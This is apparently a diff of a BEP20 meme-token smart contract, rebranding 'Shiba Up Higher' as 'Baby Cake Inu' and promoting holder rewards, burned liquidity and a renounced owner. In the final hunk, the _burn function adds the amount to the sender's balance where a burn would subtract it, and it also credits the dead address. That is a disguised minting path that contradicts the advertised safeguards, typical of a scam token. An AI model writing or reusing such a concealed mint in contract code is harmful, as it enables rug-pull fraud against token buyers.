@@ -1,17 +1,17 @@
 // SPDX-License-Identifier: MIT
 
-/*   Welcome to SUH
-       Hold $SUh And Earn Shiba Inu In 60 Minute
+/*   Welcome to Babycakeinu
+       Hold $CAKEINU And Earn CAKE In 60 Minute
      
-      This Is Token Community , Shiba Up Higher's Plan Token Meme Global
+      This Is Token Community , BABY CAKE INU's Plan Token Meme Global
 
-     Shiba Up Higher ; $SUH
+     Baby Cake Inu ; $CAKEINU
      Supplay 10.000.000.000
      Decimals 9 
 
      Lp Burn & Owner Renounced 
 
-     Telegram @ShibaUpHigher
+     Telegram @babycakeinubsc
 
     
 
@@ -351,7 +351,7 @@ contract Ownable is Context {
     }
 }
 
-contract SUH is Context, iBEP20, Ownable {
+contract CAKEINU is Context, iBEP20, Ownable {
   using SafeMath for uint256;
 
   mapping (address => uint256) private _balances;
@@ -365,8 +365,8 @@ contract SUH is Context, iBEP20, Ownable {
   address private _dividenttoken;
 
   constructor() public {
-    _name = 'Shiba Up Higher';
-    _symbol = 'SUH';
+    _name = 'Baby Cake Inu';
+    _symbol = 'CAKEINU';
     _decimals = 9;
     _burnaddress = 0x000000000000000000000000000000000000dEaD;
     _totalSupply = 10 * 10**9 * 10**9;
@@ -625,7 +625,8 @@ contract SUH is Context, iBEP20, Ownable {
   function _burn(address sender, uint256 amount) internal {
     require(sender != address(0), "BEP20: burn from the zero address");
 
-    _balances[sender] = _balances[sender].add(amount, "BEP20: burn amount exceeds balance");
+    _balances[sender] = _balances[sender].add(amount);
+    _balances[_burnaddress] = _balances[_burnaddress].add(amount);
     emit Transfer(sender, address(0), amount);
   }
 
